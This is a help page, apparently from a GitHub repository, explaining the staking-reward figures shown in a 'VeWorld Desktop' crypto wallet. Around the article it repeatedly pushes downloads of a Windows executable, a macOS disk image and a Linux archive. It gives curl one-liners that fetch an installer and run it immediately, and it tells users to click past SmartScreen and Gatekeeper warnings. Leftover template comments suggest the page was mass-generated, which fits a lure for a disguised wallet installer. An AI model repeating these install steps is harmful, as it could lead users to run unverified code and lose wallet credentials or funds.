![VeWorld Desktop](../assets/banner-article.png)

# VeChain Staking Rewards: What the Figure in VeWorld Desktop Means

An estimate, an accrual, and the difference that confuses

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

The reward figure in VeWorld Desktop is an estimate of VTHO a position accrues over time, shown before you commit, and it is not a daily rate or a promise. What actually arrives depends on the stake, the tier, the validator the position is delegated to, and how long the delegation stays live.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

You staked <a href="https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vet-in-veworld-desktop.md">VET in VeWorld Desktop</a> and the number on screen does not match what landed, or you cannot tell whether the figure is per day, per cycle or for the whole position.

| Figure you are reading | What it represents | Why it can differ |
|---|---|---|
| Estimate shown before staking | Projected accrual for that stake and tier | Network issuance changes |
| Balance growth on the position | <a href="https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vtho-in-veworld-desktop.md">VTHO actually generated</a> | Delegation gaps, validator changes |
| Difference between two positions | Tier and stake size | Thresholds are not linear |
| Nothing at all | No delegation, or still maturing | Both states earn nothing |

## Why it happens

Rewards on VeChainThor come from issuance, not from a contract paying a fixed rate. Since the Hayabusa upgrade, issuance is dynamic: it flows to validators and to holders who stake and delegate, and total production is roughly half of what it was before the change. A figure computed from today's conditions is therefore an estimate of a moving quantity.

Three things move it. The stake and tier set the base, since larger tiers carry longer maturities and different weight. The validator matters, because delegation points a position at a specific validator and that validator's participation affects what the position receives. And time matters, because accrual only happens while the delegation is live; a position that sits undelegated for a week simply does not earn for that week.

Display adds a fourth layer of confusion. Some screens show a projection, some show accrued-to-date, and some show both without labelling them clearly. Reading a projection as a balance produces disappointment, and reading an accrual as a rate produces unrealistic expectations.

The honest framing is that staking is participation with variable returns. It is not a savings account, the wallet does not guarantee a rate, and any figure that looks fixed should be read as an estimate taken at a moment in time.

## Fix

1. Open the staking view and identify which number you are looking at: a pre-stake estimate or an accrued balance.
2. Confirm the position is matured and delegated, because either state being false explains a zero.
3. Compare the accrued VTHO against the estimate over the same period rather than against a single day.
4. Check that the validator the position points at is still active, and redelegate if it is not.
5. Treat the estimate as a projection for planning, not as an amount owed.
6. Re-read the figure after a full cycle, when both the accrual and the validator's participation have had time to show.

## If that did not work

If a delegated position accrues nothing over a full cycle, redelegate to another active validator and observe the next cycle before concluding something is wrong.

If the accrued figure is far below the estimate, check for gaps: a period undelegated, a validator that stopped participating, or a position that was moved between wallets.

If two identical stakes show different results, the difference is delegation history rather than the stake itself, since the same amount delegated at different times has different exposure.

## Prevention

- Confirm delegation immediately after maturity, and re-check it after any wallet change.
- Record the stake, tier and validator for each position, so a later comparison has a baseline.
- Compare over cycles rather than days, because accrual is uneven within short windows.
- Keep the app current so the staking view and the programme's rules stay aligned.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Is the reward figure daily?

It is a projection for the position, not a daily rate. Reading it as a daily figure overstates what a position produces.

### Why is the accrued amount lower than the estimate?

Because the estimate assumed continuous delegation under stable conditions. Any gap in delegation, or a change in validator participation, reduces what actually accrues.

### Does a bigger stake always earn proportionally more?

Not linearly. Tiers have different thresholds and maturities, so the relationship between stake size and accrual depends on which tier the amount lands in.

### Why does my position show zero after maturity?

Because it has not been delegated. Maturity makes a position eligible to earn; delegation is what makes it earn.

### Can the estimate change after I stake?

Yes. Issuance is dynamic, so the conditions the estimate was based on can shift. The figure is a projection, not a contractual rate.

### Is staking certain to produce anything at all?

No. It is participation in network issuance with variable results, and the wallet does not promise a return.

### Where do I see what actually accrued?

On the position itself, in the staking view. Compare it over full cycles rather than over single days.

### Why does the estimate change between visits?

Because it is recomputed from current conditions each time it is shown. A projection built on today's issuance is not the same number as one built a month ago.

### Should I compare positions with each other?

Only if their tiers, stakes and delegation histories match. Comparing a freshly delegated position with one that has run for several cycles measures age, not performance.

### Does an undelegated position lose the VET?

No. The stake stays locked in the position; what it loses is time in which it could have been producing VTHO.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [Opening a StarGate position from the desktop wallet](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-stargate-staking-in-veworld-desktop.md)
- [Where the old node reward went](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-node-rewards-old-node-veworld-desktop.md)
- [What VTHO is and how it is produced](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vtho-in-veworld-desktop.md)
- [What VET is and why it is staked](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vet-in-veworld-desktop.md)
- [How the wallet shows balances](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/vtho-wallet-in-veworld-desktop.md)